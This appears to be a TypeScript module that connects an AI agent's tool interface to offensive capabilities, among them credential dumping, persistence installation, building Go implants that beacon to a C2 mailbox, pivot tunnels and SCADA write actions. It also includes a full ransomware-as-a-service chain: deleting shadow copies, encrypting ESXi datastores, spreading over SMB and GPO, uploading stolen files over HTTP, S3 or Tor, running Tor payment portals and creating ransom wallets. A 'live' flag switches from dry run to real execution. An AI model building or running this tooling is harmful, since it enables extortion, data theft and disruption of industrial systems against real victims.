/**
 * @module module_bridge
 * Wires unwired security modules into the agent tool dispatch surface.
 */
import * as crypto from "node:crypto"
import type { AgentToolContext, ToolRunResult } from "./agent_tools.ts"
import { hostFromTarget } from "./agent_tools.ts"

function result(
  tool: string,
  command: string,
  ctx: AgentToolContext,
  payload: unknown,
  success = true,
): ToolRunResult {
  return {
    tool,
    command,
    dryRun: !ctx.live,
    success,
    output: JSON.stringify(payload).slice(0, 4000),
  }
}

export const MODULE_BRIDGE: Record<
  string,
  (ctx: AgentToolContext, params: Record<string, unknown>) => Promise<ToolRunResult>
> = {
  hybrid_ad_audit: async (ctx, params) => {
    const { hybridADAttackChain } = await import("./hybrid_ad_entra.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const r = await hybridADAttackChain({ domain, dryRun: !ctx.live })
    return result("hybrid_ad_audit", "hybridADAttackChain", ctx, r)
  },
  oauth_audit: async (ctx, params) => {
    const mod = await import("./oauth_chain.ts")
    const raw = String(params.target ?? ctx.target)
    const target = raw.startsWith("http") ? raw : `https://${raw}/oauth/callback`
    const audit = ctx.live
      ? await mod.auditOAuthChainAsync(target, { dryRun: false })
      : mod.auditOAuthChain(target, { dryRun: true })
    return result("oauth_audit", "auditOAuthChain", ctx, audit)
  },
  webmail_audit: async (ctx, params) => {
    const { auditWebmailPersistence } = await import("./webmail_exploit.ts")
    const target = String(params.target ?? ctx.target)
    const r = await auditWebmailPersistence({ target, dryRun: !ctx.live })
    return result("webmail_audit", "auditWebmailPersistence", ctx, r)
  },
  adcs_audit: async (ctx, params) => {
    const { auditADCS } = await import("./adcs_audit.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const r = auditADCS({ domain, dcIp: String(params.dcIp ?? domain) }, { live: ctx.live })
    return result("adcs_audit", "auditADCS", ctx, r)
  },
  lolbins_audit: async (ctx) => {
    const { auditLOLBins } = await import("./lolbins_audit.ts")
    return result("lolbins_audit", "auditLOLBins", ctx, auditLOLBins({ live: ctx.live }))
  },
  ebpf_audit: async (ctx) => {
    const { auditEBPFAndPersistence } = await import("./ebpf_audit.ts")
    return result("ebpf_audit", "auditEBPFAndPersistence", ctx, auditEBPFAndPersistence({ dryRun: !ctx.live }))
  },
  uefi_audit: async (ctx) => {
    const { auditUEFIAndBootkit } = await import("./uefi_bootkit_audit.ts")
    return result("uefi_audit", "auditUEFIAndBootkit", ctx, auditUEFIAndBootkit({ live: ctx.live }))
  },
  net_device_audit: async (ctx, params) => {
    const { auditNetworkDevice } = await import("./net_device.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    return result("net_device_audit", "auditNetworkDevice", ctx, auditNetworkDevice(host, { live: ctx.live }))
  },
  cred_dump: async (ctx) => {
    const { CredentialDumpingEngine } = await import("./cred_dump.ts")
    const engine = new CredentialDumpingEngine()
    const r = await engine.dump({ dryRun: !ctx.live })
    return result("cred_dump", "CredentialDumpingEngine.dump", ctx, r)
  },
  strix_web: async (ctx, params) => {
    const { StrixCoordinator } = await import("./strix_engine.ts")
    const url = String(params.url ?? params.target_url ?? ctx.target)
    const coord = new StrixCoordinator({ live: ctx.live })
    const attack = String(params.attack ?? "form_fuzz") as "xss_reflection" | "csrf_test" | "sqli_probe" | "form_fuzz" | "auth_bypass"
    coord.queue(url, attack)
    const jobs = await coord.runAll()
    return result("strix_web", "StrixCoordinator.runAll", ctx, { url, jobs: jobs.length, results: jobs })
  },
  counter_intel: async (ctx, params) => {
    const { auditDefenses } = await import("./counter_intel.ts")
    return result("counter_intel", "auditDefenses", ctx, auditDefenses({ live: ctx.live, check: String(params.check ?? "all") }))
  },
  attack_navigator: async (ctx) => {
    const { exportNavigatorLayer, findingsToTechniques } = await import("./attack_navigator.ts")
    const findings = Object.values(ctx.graph.toJSON().assets ?? {}).flatMap((a) =>
      Object.values((a as { services?: Record<string, { vulns?: { id?: string; title?: string; severity?: string }[] }> }).services ?? {})
        .flatMap((s) => s.vulns ?? [])
        .map((v) => ({ id: v.id ?? "", title: v.title ?? "", severity: v.severity ?? "info" })),
    )
    const techniques = [...findingsToTechniques(findings).keys()]
    const layer = exportNavigatorLayer(findings, { name: ctx.target })
    return result("attack_navigator", "exportNavigatorLayer", ctx, { techniques, layerName: layer.name })
  },
  pivot_tunnel: async (ctx, params) => {
    const { createPortForwarder } = await import("./pivot_tunnel.ts")
    const method = String(params.method ?? "socks5")
    const type = method === "chisel" ? "chisel" : method === "ssh" ? "port_forward" : "socks5"
    const r = createPortForwarder(
      {
        type,
        localPort: Number(params.lport ?? 1080),
        remoteHost: String(params.rhost ?? "127.0.0.1"),
        remotePort: Number(params.rport ?? 22),
      },
      ctx.live,
    )
    return result("pivot_tunnel", "createPortForwarder", ctx, r)
  },
  iot_scada: async (ctx, params) => {
    const { executeScadaAction } = await import("./iot_scada.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await executeScadaAction(
      {
        host,
        protocol: String(params.protocol ?? "modbus"),
        action: String(params.action ?? "read"),
        port: params.port as number | undefined,
        unitId: params.unitId as number | undefined,
        address: params.address as number | undefined,
        quantity: params.quantity as number | undefined,
        value: params.value as number | boolean | undefined,
      },
      { live: ctx.live },
    )
    return result("iot_scada", "executeScadaAction", ctx, r, r.success)
  },
  telecom_audit: async (ctx, params) => {
    const { auditTelecom } = await import("./telecom_audit.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await auditTelecom(host, { live: ctx.live, snmpCommunity: String(params.community ?? "public") })
    return result("telecom_audit", "auditTelecom", ctx, r)
  },
  ot_scan: async (ctx, params) => {
    const { executeScadaAction } = await import("./iot_scada.ts")
    const { auditTelecom } = await import("./telecom_audit.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const modbus = await executeScadaAction({ host, protocol: "modbus", action: "read" }, { live: ctx.live })
    const dnp3 = await executeScadaAction({ host, protocol: "dnp3", action: "probe" }, { live: ctx.live })
    const mqtt = await executeScadaAction({ host, protocol: "mqtt", action: "connect" }, { live: ctx.live })
    const bacnet = await executeScadaAction({ host, protocol: "bacnet", action: "whois" }, { live: ctx.live })
    const telecom = await auditTelecom(host, { live: ctx.live })
    return result("ot_scan", "ot_it_telecom_scan", ctx, { modbus, dnp3, mqtt, bacnet, telecom })
  },
  persistence_install: async (ctx, params) => {
    const { PersistenceEngine } = await import("./persistence.ts")
    const engine = new PersistenceEngine()
    const r = await engine.installPersistence(String(params.mechanism ?? "cron job"), {
      live: ctx.live,
      targetOs: String(params.os ?? ""),
      payloadPath: String(params.payload ?? ""),
    })
    return result("persistence_install", "PersistenceEngine.installPersistence", ctx, r)
  },
  auto_research: async (ctx, params) => {
    const { researchCve } = await import("./auto_research.ts")
    const cveId = String(params.cve_id ?? params.cveId ?? "CVE-2021-44228")
    const r = await researchCve({ cveId, repoUrl: params.repoUrl as string | undefined, patchCommitHash: params.patchCommitHash as string | undefined }, { dryRun: !ctx.live })
    return result("auto_research", "researchCve", ctx, r)
  },
  implant_build: async (ctx, params) => {
    const { NativeImplantGenerator } = await import("./implant_gen.ts")
    const gen = new NativeImplantGenerator()
    const mailbox = String(params.mailbox ?? process.env.OURMINE_C2_MAILBOX ?? "http://127.0.0.1:8080/mailbox")
    const keyHex = String(params.key ?? crypto.randomBytes(32).toString("hex"))
    const session = String(params.session ?? "sess_" + Date.now())
    const source = gen.generateGo(mailbox, keyHex, session)
    if (!ctx.live) {
      return result("implant_build", "NativeImplantGenerator.generateGo", ctx, { sourceLength: source.length, built: false, dryRun: true })
    }
    const outDir = String(params.outDir ?? "/tmp/ourmine_beacon_build")
    const built = await gen.buildGo(source, outDir, { goos: String(params.goos ?? "linux"), goarch: String(params.goarch ?? "amd64") })
    return result("implant_build", "NativeImplantGenerator.buildGo", ctx, built, built.status === "built")
  },
  mobile_audit: async (ctx, params) => {
    const { listADBDevices } = await import("./mobile.ts")
    const devices = listADBDevices(ctx.live)
    return result("mobile_audit", "listADBDevices", ctx, { devices, apk_path: params.apk_path ?? null })
  },
  firmware_audit: async (ctx, params) => {
    const { analyzeFirmware } = await import("./firmware.ts")
    const filePath = String(params.path ?? params.firmware_path ?? "")
    if (!filePath) return result("firmware_audit", "analyzeFirmware", ctx, { error: "path required" }, false)
    const sections = analyzeFirmware(filePath)
    return result("firmware_audit", "analyzeFirmware", ctx, { path: filePath, sections: sections.length, sample: sections.slice(0, 5) })
  },
  opsec_review: async (ctx, params) => {
    const { gateExecution } = await import("./opsec_gate.ts")
    const command = String(params.command ?? "id")
    const tool = String(params.tool ?? "bash")
    const review = await gateExecution({ tool, command, live: ctx.live, profile: String(params.profile ?? "default") })
    return result("opsec_review", "gateExecution", ctx, review)
  },
  proof_export: async (ctx) => {
    const { buildProofPack, writeProofPack } = await import("./proof_pack.ts")
    const pack = buildProofPack(ctx.graph)
    const dir = String(process.env.OURMINE_PROOF_DIR ?? ".ourmine/proof")
    const file = writeProofPack(pack, dir)
    return result("proof_export", "writeProofPack", ctx, { path: file, merkleRoot: pack.merkleRoot })
  },
  raas_campaign: async (ctx, params) => {
    const { runRaasCampaign } = await import("./raas_engine.ts")
    const targetDir = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = await runRaasCampaign({
      targetDir,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      esxiHost: params.esxi_host as string | undefined,
      smbTargets: params.smb_targets as string[] | undefined,
      domain: params.domain as string | undefined,
      familyName: String(params.family ?? "OURMINE-RAAS"),
    })
    return result("raas_campaign", "runRaasCampaign", ctx, r, !r.dryRun || r.leakCatalog.count >= 0)
  },
  raas_vss_wipe: async (ctx, params) => {
    const { deleteVolumeShadowCopies } = await import("./raas_engine.ts")
    const r = deleteVolumeShadowCopies({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_vss_wipe", "deleteVolumeShadowCopies", ctx, r, r.success || r.dryRun)
  },
  raas_leak_catalog: async (ctx, params) => {
    const { buildLeakCatalog } = await import("./raas_engine.ts")
    const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = buildLeakCatalog(root, { live: ctx.live, maxFiles: Number(params.max_files ?? 100) })
    return result("raas_leak_catalog", "buildLeakCatalog", ctx, { count: r.entries.length, manifestPath: r.manifestPath, totalBytes: r.totalBytes })
  },
  raas_esxi_encrypt: async (ctx, params) => {
    const { encryptEsxiDatastores } = await import("./raas_engine.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await encryptEsxiDatastores(host, { live: ctx.live, forceLive: Boolean(params.forceLive), mountPath: params.mount_path as string | undefined })
    return result("raas_esxi_encrypt", "encryptEsxiDatastores", ctx, r, r.dryRun || r.encrypted.length >= 0)
  },
  raas_smb_spread: async (ctx, params) => {
    const { spreadViaSmb } = await import("./raas_engine.ts")
    const targets = (params.targets as string[] | undefined) ?? [hostFromTarget(ctx.target)]
    const cmd = String(params.command ?? "cmd /c echo ourmine_raas_marker")
    const r = spreadViaSmb(targets, cmd, { live: ctx.live, forceLive: Boolean(params.forceLive), domain: params.domain as string | undefined })
    return result("raas_smb_spread", "spreadViaSmb", ctx, r, r.success || r.dryRun)
  },
  raas_gpo_spread: async (ctx, params) => {
    const { spreadViaGpo } = await import("./raas_engine.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = spreadViaGpo(domain, payload, { live: ctx.live, forceLive: Boolean(params.forceLive), dc: params.dc as string | undefined })
    return result("raas_gpo_spread", "spreadViaGpo", ctx, r)
  },
  raas_payment: async (ctx, params) => {
    const { generatePaymentBundle } = await import("./raas_engine.ts")
    const r = generatePaymentBundle({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_payment", "generatePaymentBundle", ctx, { keyId: r.keyId, torPaymentId: r.torPaymentId, portalDescriptorPath: r.portalDescriptorPath })
  },
  raas_exfil_upload: async (ctx, params) => {
    const { buildLeakCatalog } = await import("./raas_engine.ts")
    const { uploadLeakManifestAdvanced } = await import("./raas_advanced.ts")
    let manifestPath = String(params.manifest_path ?? "")
    if (!manifestPath) {
      const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/tmp")
      const cat = buildLeakCatalog(root, { maxFiles: Number(params.max_files ?? 50) })
      manifestPath = cat.manifestPath
    }
    const r = await uploadLeakManifestAdvanced(manifestPath, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      mode: params.mode as "http" | "s3" | "tor" | "auto" | undefined,
      uploadUrl: params.upload_url as string | undefined,
      bearerToken: params.bearer_token as string | undefined,
    })
    return result("raas_exfil_upload", "uploadLeakManifestAdvanced", ctx, r, r.uploaded || r.dryRun)
  },
  raas_gpo_deploy: async (ctx, params) => {
    const { modifyGpoLogonScript } = await import("./raas_advanced.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = modifyGpoLogonScript(domain, payload, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      dc: params.dc as string | undefined,
      username: params.username as string | undefined,
      password: params.password as string | undefined,
      gpoGuid: params.gpo_guid as string | undefined,
    })
    return result("raas_gpo_deploy", "modifyGpoLogonScript", ctx, r, r.smbUploaded || r.dryRun)
  },
  raas_tor_portal: async (ctx, params) => {
    const { provisionTorPortal } = await import("./raas_advanced.ts")
    const r = provisionTorPortal(
      {
        keyId: String(params.key_id ?? `sess_${Date.now()}`),
        bitcoinAddress: String(params.btc ?? "bc1qourmine000000000000000000000"),
        moneroAddress: String(params.xmr ?? "4ourmine000000000000000000000000000000000000000000000000000000000"),
      },
      { live: ctx.live, forceLive: Boolean(params.forceLive) },
    )
    return result("raas_tor_portal", "provisionTorPortal", ctx, r)
  },
  raas_esxi_deploy: async (ctx, params) => {
    const { deployEsxiEncryptor } = await import("./raas_advanced.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const keyId = String(params.key_id ?? `esxi_${Date.now()}`)
    const r = deployEsxiEncryptor(host, keyId, { live: ctx.live, forceLive: Boolean(params.forceLive), sshUser: params.ssh_user as string | undefined })
    return result("raas_esxi_deploy", "deployEsxiEncryptor", ctx, r, r.deployed || r.dryRun)
  },
  raas_wallet_create: async (ctx, params) => {
    const { createWalletPair, walletTerminalSummary, ensureWalletToolchain } = await import("./raas_wallet.ts")
    const opts = {
      ephemeral: params.persist !== true,
      campaignId: params.campaign_id as string | undefined,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      autoInstall: params.auto_install !== false,
    }
    let install = undefined as Awaited<ReturnType<typeof ensureWalletToolchain>> | undefined
    if (params.install_deps === true || (opts.autoInstall && ctx.live && opts.forceLive)) {
      install = ensureWalletToolchain(opts)
    }
    const { btc, xmr, install: createInstall } = createWalletPair(opts)
    return result("raas_wallet_create", "createWalletPair", ctx, {
      btc: { id: btc.id, address: btc.address, ephemeral: btc.ephemeral, source: btc.source },
      xmr: { id: xmr.id, address: xmr.address, ephemeral: xmr.ephemeral, source: xmr.source, error: xmr.error },
      install: install ?? createInstall,
      summary: walletTerminalSummary({ ephemeral: params.persist !== true }),
    })
  },
  raas_wallet_install_deps: async (ctx, params) => {
    const { ensureWalletToolchain } = await import("./raas_wallet.ts")
    const r = ensureWalletToolchain({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_install_deps", "ensureWalletToolchain", ctx, r, r.installed.length > 0 || r.dryRun)
  },
  raas_wallet_balance: async (ctx, params) => {
    const { getWalletBalance } = await import("./raas_wallet.ts")
    const r = await getWalletBalance(String(params.wallet_id ?? ""), { live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_balance", "getWalletBalance", ctx, r)
  },
  raas_wallet_list: async (ctx) => {
    const { listWallets, walletTerminalSummary, checkWalletToolchain } = await import("./raas_wallet.ts")
    return result("raas_wallet_list", "listWallets", ctx, {
      toolchain: checkWalletToolchain(),
      wallets: listWallets({}),
      summary: walletTerminalSummary({}),
    })
  },
  raas_wallet_wipe: async (ctx, params) => {
    const { wipeWallet, wipeAllWallets } = await import("./raas_wallet.ts")
    const opts = { live: ctx.live, forceLive: Boolean(params.forceLive) }
    const r = params.all ? wipeAllWallets(opts) : wipeWallet(String(params.wallet_id ?? ""), opts)
    return result("raas_wallet_wipe", params.all ? "wipeAllWallets" : "wipeWallet", ctx, r, Boolean((r as { wiped?: boolean }).wiped ?? (r as { count?: number }).count))
  },
}

export function bridgedToolNames(): string[] {
  return Object.keys(MODULE_BRIDGE)
}

export async function runBridgedModule(
  ctx: AgentToolContext,
  toolName: string,
  params: Record<string, unknown> = {},
): Promise<ToolRunResult | null> {
  const fn = MODULE_BRIDGE[toolName]
  if (!fn) return null
  return fn(ctx, params)
}

export default { MODULE_BRIDGE, bridgedToolNames, runBridgedModule }
